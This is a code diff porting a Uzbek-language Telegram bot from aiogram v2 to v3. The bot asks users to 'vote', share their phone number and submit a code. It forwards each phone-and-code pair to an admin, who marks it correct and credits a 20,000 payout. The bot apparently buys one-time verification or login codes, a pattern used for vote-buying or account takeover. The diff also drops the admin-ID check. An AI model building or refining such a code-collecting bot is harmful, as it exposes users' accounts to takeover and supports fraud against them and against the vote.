@@ -5,7 +5,7 @@ import logging
 import re
 from aiogram import Bot, Dispatcher, types
 from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
-from aiogram.utils import executor
+from aiogram.filters import Command
 from dotenv import load_dotenv
 from aiohttp import web
 
@@ -24,12 +24,8 @@ if not BOT_TOKEN:
     logger.error("❌ BOT_TOKEN topilmadi!")
     exit(1)
 
-if ADMIN_ID == 0:
-    logger.error("❌ ADMIN_ID topilmadi!")
-    exit(1)
-
 bot = Bot(token=BOT_TOKEN)
-dp = Dispatcher(bot)
+dp = Dispatcher()
 
 # ================= HOLATLAR =================
 user_states = {}
@@ -39,26 +35,26 @@ withdraw_states = {}
 
 # ================= TUGMALAR =================
 phone_keyboard = ReplyKeyboardMarkup(
-    keyboard=[[KeyboardButton("📞 Telefon raqamni yuborish", request_contact=True)]],
+    keyboard=[[KeyboardButton(text="📞 Telefon raqamni yuborish", request_contact=True)]],
     resize_keyboard=True,
     one_time_keyboard=True
 )
 
 user_menu = ReplyKeyboardMarkup(
     keyboard=[
-        [KeyboardButton("🗳️ Ovoz berish")],
-        [KeyboardButton("💳 Hamyon"), KeyboardButton("💰 Balans")],
-        [KeyboardButton("💸 Yechish")]
+        [KeyboardButton(text="🗳️ Ovoz berish")],
+        [KeyboardButton(text="💳 Hamyon"), KeyboardButton(text="💰 Balans")],
+        [KeyboardButton(text="💸 Yechish")]
     ],
     resize_keyboard=True
 )
 
 admin_menu = ReplyKeyboardMarkup(
     keyboard=[
-        [KeyboardButton("📊 Statistika")],
-        [KeyboardButton("📨 Barchaga xabar")],
-        [KeyboardButton("📋 Kutayotgan kodlar")],
-        [KeyboardButton("💸 Yechish so'rovlari")]
+        [KeyboardButton(text="📊 Statistika")],
+        [KeyboardButton(text="📨 Barchaga xabar")],
+        [KeyboardButton(text="📋 Kutayotgan kodlar")],
+        [KeyboardButton(text="💸 Yechish so'rovlari")]
     ],
     resize_keyboard=True
 )
@@ -155,7 +151,7 @@ async def init_db():
             await conn.close()
 
 # ================= 1. START =================
-@dp.message_handler(commands=['start'])
+@dp.message(Command("start"))
 async def start(message: types.Message):
     telegram_id = message.from_user.id
     logger.info(f"👤 /start bosildi: {telegram_id}")
@@ -218,7 +214,7 @@ async def start(message: types.Message):
             await conn.close()
 
 # ================= 2. OVOZ BERISH =================
-@dp.message_handler(lambda msg: msg.text == "🗳️ Ovoz berish")
+@dp.message(lambda msg: msg.text == "🗳️ Ovoz berish")
 async def vote_start(message: types.Message):
     telegram_id = message.from_user.id
     
@@ -237,7 +233,7 @@ async def vote_start(message: types.Message):
     )
 
 # ================= 3. TELEFON RAQAM (Kontakt) =================
-@dp.message_handler(content_types=['contact'])
+@dp.message(lambda msg: msg.contact is not None)
 async def receive_phone_contact(message: types.Message):
     telegram_id = message.from_user.id
     
@@ -253,7 +249,7 @@ async def receive_phone_contact(message: types.Message):
     await process_phone(message, phone)
 
 # ================= 4. TELEFON RAQAM (Qo'lda) =================
-@dp.message_handler(lambda msg: user_states.get(msg.from_user.id) == "waiting_phone")
+@dp.message(lambda msg: user_states.get(msg.from_user.id) == "waiting_phone")
 async def receive_phone_text(message: types.Message):
     telegram_id = message.from_user.id
     
@@ -321,7 +317,7 @@ async def process_phone(message: types.Message, phone: str):
         logger.error(f"❌ Admin'ga yuborishda xatolik: {e}")
 
 # ================= 5. KODNI QABUL QILISH =================
-@dp.message_handler(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
+@dp.message(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
 async def receive_code(message: types.Message):
     code = message.text.strip()
     telegram_id = message.from_user.id
@@ -360,8 +356,8 @@ async def receive_code(message: types.Message):
         
         keyboard = InlineKeyboardMarkup(row_width=2)
         keyboard.add(
-            InlineKeyboardButton("✅ To'g'ri kod (+20 000)", callback_data=f"verify_{telegram_id}_{phone}_{code}"),
-            InlineKeyboardButton("❌ Noto'g'ri kod", callback_data=f"reject_{telegram_id}")
+            InlineKeyboardButton(text="✅ To'g'ri kod (+20 000)", callback_data=f"verify_{telegram_id}_{phone}_{code}"),
+            InlineKeyboardButton(text="❌ Noto'g'ri kod", callback_data=f"reject_{telegram_id}")
         )
         
         await bot.send_message(
@@ -381,7 +377,7 @@ async def receive_code(message: types.Message):
     user_states[telegram_id] = "done"
 
 # ================= 6. ADMIN TASDIQLASH =================
-@dp.callback_query_handler(lambda c: c.data.startswith(("verify_", "reject_")))
+@dp.callback_query(lambda c: c.data.startswith(("verify_", "reject_")))
 async def admin_action(callback: types.CallbackQuery):
     data = callback.data.split("_")
     action = data[0]
@@ -488,7 +484,7 @@ async def admin_action(callback: types.CallbackQuery):
                 await conn.close()
 
 # ================= 7. HAMYON / BALANS =================
-@dp.message_handler(lambda msg: msg.text in ["💳 Hamyon", "💰 Balans"])
+@dp.message(lambda msg: msg.text in ["💳 Hamyon", "💰 Balans"])
 async def show_balance(message: types.Message):
     telegram_id = message.from_user.id
     
@@ -530,7 +526,7 @@ async def show_balance(message: types.Message):
             await conn.close()
 
 # ================= 8. YECHISH =================
-@dp.message_handler(lambda msg: msg.text == "💸 Yechish")
+@dp.message(lambda msg: msg.text == "💸 Yechish")
 async def withdraw_start(message: types.Message):
     telegram_id = message.from_user.id
     
@@ -586,7 +582,7 @@ async def withdraw_start(message: types.Message):
             await conn.close()
 
 # ================= 9. YECHISH TELEFON =================
-@dp.message_handler(lambda msg: withdraw_states.get(msg.from_user.id) == "waiting_withdraw_phone")
+@dp.message(lambda msg: withdraw_states.get(msg.from_user.id) == "waiting_withdraw_phone")
 async def withdraw_phone(message: types.Message):
     telegram_id = message.from_user.id
     phone = message.text.strip()
@@ -636,8 +632,8 @@ async def withdraw_phone(message: types.Message):
             
             keyboard = InlineKeyboardMarkup(row_width=2)
             keyboard.add(
-                InlineKeyboardButton("✅ To'landi", callback_data=f"withdraw_done_{telegram_id}_{balance}"),
-                InlineKeyboardButton("❌ Rad etish", callback_data=f"withdraw_reject_{telegram_id}")
+                InlineKeyboardButton(text="✅ To'landi", callback_data=f"withdraw_done_{telegram_id}_{balance}"),
+                InlineKeyboardButton(text="❌ Rad etish", callback_data=f"withdraw_reject_{telegram_id}")
             )
             
             await bot.send_message(
@@ -663,7 +659,7 @@ async def withdraw_phone(message: types.Message):
             await conn.close()
 
 # ================= 10. ADMIN YECHISH =================
-@dp.callback_query_handler(lambda c: c.data.startswith(("withdraw_done_", "withdraw_reject_")))
+@dp.callback_query(lambda c: c.data.startswith(("withdraw_done_", "withdraw_reject_")))
 async def admin_withdraw_action(callback: types.CallbackQuery):
     data = callback.data.split("_")
     action = data[1]
@@ -738,7 +734,7 @@ async def admin_withdraw_action(callback: types.CallbackQuery):
                 await conn.close()
 
 # ================= 11. ADMIN STATISTIKA =================
-@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📊 Statistika")
+@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📊 Statistika")
 async def admin_stats(message: types.Message):
     conn = None
     try:
@@ -769,7 +765,7 @@ async def admin_stats(message: types.Message):
             await conn.close()
 
 # ================= 12. KUTAYOTGAN KODLAR =================
-@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📋 Kutayotgan kodlar")
+@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📋 Kutayotgan kodlar")
 async def pending_codes(message: types.Message):
     conn = None
     try:
@@ -796,7 +792,7 @@ async def pending_codes(message: types.Message):
             await conn.close()
 
 # ================= 13. YECHISH SO'ROVLARI =================
-@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "💸 Yechish so'rovlari")
+@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "💸 Yechish so'rovlari")
 async def pending_withdraws(message: types.Message):
     conn = None
     try:
@@ -824,12 +820,12 @@ async def pending_withdraws(message: types.Message):
             await conn.close()
 
 # ================= 14. BARCHAGA XABAR =================
-@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📨 Barchaga xabar")
+@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📨 Barchaga xabar")
 async def broadcast_start(message: types.Message):
     admin_states[ADMIN_ID] = "waiting_message"
     await message.answer("📨 Xabar matnini yozing:")
 
-@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and admin_states.get(ADMIN_ID) == "waiting_message")
+@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and admin_states.get(ADMIN_ID) == "waiting_message")
 async def broadcast_send(message: types.Message):
     text = message.text
     admin_states.pop(ADMIN_ID, None)
@@ -856,7 +852,8 @@ async def broadcast_send(message: types.Message):
         if conn:
             await conn.close()
 
-# ================= 15. BALANS KOMANDASI =================@dp.message_handler(commands=['balance'])
+# ================= 15. BALANS KOMANDASI =================
+@dp.message(Command("balance"))
 async def check_balance(message: types.Message):
     if message.from_user.id == ADMIN_ID:
         return
@@ -889,7 +886,7 @@ async def check_balance(message: types.Message):
             await conn.close()
 
 # ================= 16. ADMIN MENU QAYTARISH =================
-@dp.message_handler(commands=['admin'])
+@dp.message(Command("admin"))
 async def admin_panel(message: types.Message):
     if message.from_user.id == ADMIN_ID:
         await message.answer(
@@ -930,34 +927,25 @@ async def keep_alive():
         await asyncio.sleep(60)
 
 # ================= MAIN =================
-async def on_startup(dp):
+async def main():
     logger.info("🤖 Bot ishga tushmoqda...")
+    
+    # Database init
     await init_db()
+    
+    # HTTP server
     asyncio.create_task(start_http_server())
+    
+    # Keep-alive
     asyncio.create_task(keep_alive())
-    logger.info("✅ Bot tayyor!")
-
-async def on_shutdown(dp):
-    logger.info("🛑 Bot o'chmoqda...")
-    try:
-        await bot.close()
-    except:
-        pass
-    logger.info("✅ Bot o'chdi")
+    
+    # Botni polling orqali ishga tushirish
+    await dp.start_polling(bot, skip_updates=True)
 
 if __name__ == "__main__":
-    while True:
-        try:
-            executor.start_polling(
-                dp, 
-                on_startup=on_startup, 
-                on_shutdown=on_shutdown,
-                skip_updates=True,
-                timeout=300
-            )
-            break
-        except Exception as e:
-            logger.error(f"❌ Bot ishdan chiqdi: {e}")
-            logger.info("🔄 10 sekunddan keyin qayta ishga tushadi...")
-            import time
-            time.sleep(10)
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        logger.info("🛑 Bot to'xtatildi!")
+    except Exception as e:
+        logger.error(f"❌ Bot ishdan chiqdi: {e}")
